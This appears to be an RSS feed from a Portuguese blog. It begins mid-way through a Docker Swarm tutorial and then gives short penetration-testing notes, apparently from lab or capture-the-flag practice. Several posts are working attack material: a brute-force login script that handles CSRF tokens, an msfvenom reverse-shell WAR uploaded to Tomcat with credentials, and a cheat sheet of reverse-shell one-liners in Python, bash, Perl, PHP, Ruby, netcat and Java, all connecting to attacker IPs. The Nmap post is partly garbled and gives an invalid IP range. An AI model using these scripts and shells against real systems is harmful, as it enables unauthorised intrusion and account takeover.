docker-machine stop linuxtips # docker-machine ls  # docker-machine start linuxtips # docker-machine rm linuxtips # eval $(docker-machine env -u) Docker Swarm Você consegue construir clusters de containers com caracateristicas importantes como balanceador de cargas e failover.
Para criar um clustercom o docker swarm, basta indicar quais os hosts que ele irá supervisionar e o restante é com ele.
Cuida automaticamente do balanceamento de carga.
O Docker Swarm é bastante simples e se resume a um manager e diversos workers. O manager é o responsavel por orquestrar os containers e distribui-los entre os hosts workers. Os workers são os que carregam o piano, e hospedam os containers.
Worker = Container em execução
Manager = Conhece os detalhes do cluster, sabe todos os containers e serviços.
Para testar, podemos subir três maquinas e instalar o docker em cada uma delas.
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Feito isso, basta rodar na maquina 01, o comando:
docker swarm init Será gerado um token, que iremos utilizar e rodar nas maquinas do node, que serão as maquinas 02 e 03.
Depois podera visualizar na maquina manager, todos os nodes que estão adicionados com o comando:
docker node ls Para visualizar o token da maquina 02 para adiciona-la commo manager e não como worker, basta fazer:
docker swarm join-token manager Com isso será exibido o token de manager, para ser executado no seu outro host.
Mesma coisa caso fosse um worker
docker swarm join-token worker Para promover um node worker para manager basta fazer:
docker node promote maquina-02 docker node demote maquina-02 Agora se você quiser remover o node do cluster basta digitar o comando:
docker swarm leave Também remova ele do nosso manager ativo, com o comando
docker node rm maquina-02 Para remover um node manager, é necessário forçar com a flag &amp;ndash;force
docker swarm leave --force E depois remover do node manager
docker node rm maquina-03 Docker Services O service é um VIP ou DNS que realizara o balanceamento de requisições entre os containers. Podemos estabelecer um numero x de containers respondendo por um service e esses containers estarão espalhados pelo nosso cluster, entre nossos nodes, garantindo alta disponibilidade e balanceamento de carga. Tudo isso nativamente.
Os services é uma forma, já utlizada no kubernetes, de você conseguir gerenciar melhor seus containers. Também uma maneira muito simples e efetiva para escalar seu ambiente. Aumentando ou diminuindo a quantidade de containers que responderá para determinado service.
Exemplo:
Nome do service que desejo criar: webserver
Quantidade de containers que desejo debaixo do service: 5
Portas que iremos blindar, entre o service e o node: 8080:80
Imagem dos containers que irei utilizar: NGINX
O comando ficaria assim =&amp;gt;
docker service create --name webserver --replicas 5 -p 8080:80 nginx Para testar faça um curl em qualquer ip dos nodes que subiu:8080
Para listar os services faça
docker service ls Se quisermos saber onde estão rodando nossos containers, em quais nodes eles estçao sendo executados, basta digitar o seguinte comando:
docker service ps webserver Assim conseguiremos saber onde está rodando cada container e ainda o seu status.
Se precisamos saber maiores detalhes sobre o service, basta utlizar o subcomando &amp;ldquo;inspect&amp;rdquo;.
docker service inspect webserver Na saída do &amp;ldquo;inspect&amp;rdquo; conseguiremos pegar informações importantes sobre nosso service, como portas expostas, volumes, containers, limitações, entre outras coisas.
Lembre-se meu cenário de nodes é:
root@FXSHELL-01 ~# root@FXSHELL-02 ~# root@FXSHELL-03 ~# Posso ter muitas replicas divididas e distribuidas e balanceadas nesses 3 nodes.
Uma informação muito importante é o endereço do VIP do service, que estara listado no comando &amp;ldquo;insepect&amp;rdquo;.
Esse é o endereço do IP do balanceador desse service, ou seja, sempre que acessarem via esse IP, ele distribuirá a conexão entre os containers.
Agora se quisermos aumentar o número de containers debaixo desse service, é muito simples. Basta executar o comando a seguir:
docker service scale webserver=5 Pronto, agora temos dez containers respondendo requisições debaido do nosso service webserver.
Para visualizar basta executar:
docker service ls Ah não quero que um determinado node receba mais containers, posso dar um pause neste cara, com o comando abaixo:
docker node update --availability pause FXSHELL-02 Para ativa-lo novamente:
docker node update --availability active FXSHELL-02 Para retirar temporariamente um node para manutenção por exemplo, faça:
docker node update --availability drain FXSHELL-02 Todos os containers que estavam no FXSHELL-02, vão ser realocados para os outros 2.
Para visualizar basta executar:
docker service ps webserver Para saber em quais nodes eseles estão em execução, lembre-se do &amp;lsquo;docker service ls webserver&amp;rsquo;
Para acessar os logs desse service, basta digitar:
docker service logs -f webserver Assim você terá acesso aos logs de todos os containers desse service.
Para remover o service é simples
docker service rm webserver Você pode checar com o comando
docker service ls Criar um service com um volume conectado é bastante simples, basta fazer:
docker service create --name webserver --replicas 5 -p 8080:80 --mount type=volume,src=teste,dst=/app, nginx Quando criamos um service com um volume conectado a ele, isso indica que esse volume estará disponivel em todos os nossos containers desse service, ou seja, o volume com o nome de &amp;ldquo;teste&amp;rdquo; estara montado em todos os containers no diretorio &amp;ldquo;/app&amp;rdquo;.
Exemplo de como ficou:
Docker Secrets!!!!!!!## ]]></content:encoded>
    </item>
    <item>
      <title>Steghide</title>
      <link>/posts/steghide/</link>
      <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
      <guid>/posts/steghide/</guid>
      <description>$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg </description>
      <content:encoded><![CDATA[$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg ]]></content:encoded>
    </item>
    <item>
      <title>Wfuzz</title>
      <link>/posts/wfuzz/</link>
      <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
      <guid>/posts/wfuzz/</guid>
      <description>É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir saída
w caminho da wordlist
hc ignorar erros</description>
      <content:encoded><![CDATA[É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir saída
w caminho da wordlist
hc ignorar erros
]]></content:encoded>
    </item>
    <item>
      <title>GoBuster</title>
      <link>/posts/gobuster/</link>
      <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
      <guid>/posts/gobuster/</guid>
      <description>GoBuster Primo do DIRB
O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &amp;lt;modo&amp;gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &amp;lt;threads&amp;gt; – número de encadeamentos a serem executados (padrão: 10). -u &amp;lt;url / domain&amp;gt; – URL completo (incluindo esquema) ou nome de domínio base.</description>
      <content:encoded><![CDATA[GoBuster Primo do DIRB
O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &amp;lt;modo&amp;gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &amp;lt;threads&amp;gt; – número de encadeamentos a serem executados (padrão: 10). -u &amp;lt;url / domain&amp;gt; – URL completo (incluindo esquema) ou nome de domínio base. -v – saída detalhada (mostra todos os resultados). -w &amp;lt;wordlist&amp;gt; – caminho para a lista de palavras usada para força bruta (use – para stdin). Eu poderia usar o DIRB? Sim, por que ele vai fazer o scanning de páginas também. Ficaria assim:
$ dirb http://192.168.219.128:65535 /usr/share/dirb/wordlists/big.txt
Com o GoBuster faria o brute force &#43; o scanning de diretórios, utilizando a mesma wordlist do DIRB.
$ gobuster dir -u http://192.168.219.128:65535 -w /usr/share/dirb/wordlists/big.txt
-w &amp;lt;wordlist&amp;gt; -u &amp;lt;url&amp;gt; ]]></content:encoded>
    </item>
    <item>
      <title>Wordlist com Palavras do Site</title>
      <link>/posts/wordlist/</link>
      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
      <guid>/posts/wordlist/</guid>
      <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.</description>
      <content:encoded><![CDATA[Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break ]]></content:encoded>
    </item>
    <item>
      <title>Dirsearch</title>
      <link>/posts/dirsearch/</link>
      <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
      <guid>/posts/dirsearch/</guid>
      <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *</description>
      <content:encoded><![CDATA[DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&amp;gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite O dirsearch vai encontrar pastas e urls uteis para a exploração de vulnerabilidades.
]]></content:encoded>
    </item>
    <item>
      <title>sh_MSFvenom</title>
      <link>/posts/sh_msfvenom/</link>
      <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
      <guid>/posts/sh_msfvenom/</guid>
      <description>echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.</description>
      <content:encoded><![CDATA[echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&amp;#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar  # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
http://10.10.10.194:8080/exploit.war/
volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
listening on [any] 4444 &amp;hellip; connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
$ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
]]></content:encoded>
    </item>
    <item>
      <title>The_silver_searcher</title>
      <link>/posts/the_silver_searcher/</link>
      <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
      <guid>/posts/the_silver_searcher/</guid>
      <description>AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
apt-get install silversearcher-ag</description>
      <content:encoded><![CDATA[AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
apt-get install silversearcher-ag
]]></content:encoded>
    </item>
    <item>
      <title>Netcat</title>
      <link>/posts/netcat/</link>
      <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
      <guid>/posts/netcat/</guid>
      <description>Netcat ================
O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes.</description>
      <content:encoded><![CDATA[Netcat ================
O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes. Os usos comuns incluem:
&#43; Proxies TCP simples &#43; Clientes e servidores HTTP baseados em shell-script &#43; Teste de daemon de rede &#43; A Socks ou HTTP ProxyCommand para ssh Sintaxe:
$ nc -nlvp 1234
-n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados.
-l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado.
-v Faça nc dar uma saída mais detalhada.
-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios.
Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na porta 1234 uma conexão, para usar um shell reverso por exemplo.
]]></content:encoded>
    </item>
    <item>
      <title>Reverse Shell</title>
      <link>/posts/dicasdereverseshell/</link>
      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
      <guid>/posts/dicasdereverseshell/</guid>
      <description>Python =====================
python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.</description>
      <content:encoded><![CDATA[Python =====================
python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.15&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; Bash =====================
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &#39;use Socket;$i=&amp;quot;10.0.0.1&amp;quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; PHP =====================
php -r &#39;$sock=fsockopen(&amp;quot;10.0.0.1&amp;quot;,1234);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; Ruby =====================
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.0.0.1&amp;quot;,1234).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
    </item>
    <item>
      <title>Nikto</title>
      <link>/posts/nikto/</link>
      <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
      <guid>/posts/nikto/</guid>
      <description>NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter .</description>
      <content:encoded><![CDATA[NIKTO ================
Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados  Não é necessário fazer a instalação do mesmo pois ele é um script perl.
Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
https://github.com/sullo/nikto
git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h &#43; alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, é necessário colocar o &amp;lsquo;http&amp;rsquo; na frente.
ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
]]></content:encoded>
    </item>
    <item>
      <title>Searchexploit</title>
      <link>/posts/searchexploit/</link>
      <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
      <guid>/posts/searchexploit/</guid>
      <description>SEARCHSPLOIT ================
Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.</description>
      <content:encoded><![CDATA[SEARCHSPLOIT ================
Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
Com as informações dos serviços coletados pelo NMAP, seria maneiro procurar no searchsploit se este serviço contém alguma vulnerabilidade, procurando um exploit para ele.
Neste caso podemos usar o searchsploit da seguinte maneira:
fpmatta@T-REX ~&amp;gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &amp;#39;CWD&amp;#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &amp;#39;deny_file&amp;#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- Para atualizar a base do searchsploit faça:
$ searchsploit -u
Se não tiver ele instalado no seu S.O (caso não esteja utilizando o Kali linux):
Clone o repositório, adicione o binário ao seu $PATH e edite o arquivo de configuração para refletir o caminho do git:
$ sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
$ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
]]></content:encoded>
    </item>
    <item>
      <title>NMAP</title>
      <link>/posts/toolsforpentest/</link>
      <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
      <guid>/posts/toolsforpentest/</guid>
      <description>NMAP ================
O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.</description>
      <content:encoded><![CDATA[NMAP ================
O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.
Para cada caso de enumeração e circunstâncias, existe flags especificas para cada tipo de alvo, geralmente dou um scan superficial no inicio, e depois utilizo algo mais profundo. As flags que mais utilizo são as seguintes:
nmap -sV -sC -Pn -T4 -v -p- &amp;ndash;min-rate=10000 Identifica hosts ativos com a porta 445 aberta
nmap &amp;ndash;open -v -sS -p 445 -Pn 293.268.20.0/34 -oG smb.txt Cria arquivo com uma saída mais limpa, somente IPs
cat smb.txt |grep &amp;ldquo;Up&amp;rdquo;|cut -d &amp;quot;&amp;quot; -f2 &amp;gt; targets Canivete suiço para enumerar os hosts (nome,dominio..)
crackmapexec smb targets Capturar hashes NBT-NS / LLMNR
Alterar o arquivo /etc/responder/Responder.conf
; Specific IP Addresses to respond to (default = All) ; Example: RespondTo = 10.20.1.100-150, 10.20.3.10 RespondTo = &amp;lt;host_1&amp;gt;&amp;lt;host_2&amp;gt;&amp;lt;host_3&amp;gt;&amp;lt;host_4&amp;gt;&amp;lt;&amp;hellip;&amp;gt;
responder -l -Prv Também são muito utilizadas as flags abaixo desde o mais simples para um scan mais completo.
Varredura de porta TCP SYN (padrão)
nmap -sS 192.168.1.1 Tentativas para determinar a versão do serviço em execução na porta
nmap -sV 192.168.1.1 Scan com scripts NSE padrão. Considerado útil para descoberta e segurança
nmap -sC 192.168.1.1 Desative a descoberta de host. Somente varredura de porta.
nmap -Pn 192.168.1.1-5 Scan agressivo (4) mais acelerado, utilizar somente quando você estiver em uma rede razoavelmente rápida e confiável.
nmap -T4 192.168.1.1 Aumente o nível de verbosidade (-v ou use -vv mais para obter um efeito maior)
nmap -v 192.168.1.1 Envie pacotes não mais lentos que &amp;lt;número&amp;gt; por segundo. (&amp;ndash;min-rate)
nmap --min-rate=1000 192.168.1.1 Envie pacotes não mais rapidos que &amp;lt;número&amp;gt; por segundo. (&amp;ndash;max-rate)
nmap --max-rate=1000 192.168.1.1 Efetua o handshake triplo do TCP. O Nmap solicita ao sistema operacional subjacente que estabeleça uma conexão com o destino na porta especificada.
nmap -sT 192.168.1 Envia um SYN TCP para ver se a porta de destino responde com um SYN ACK (porta aberta) ou um RST (porta fechada). Também conhecida como varredura semi-aberta, pois não conclui o handshake do TCP. Esse é o padrão para usuários root.
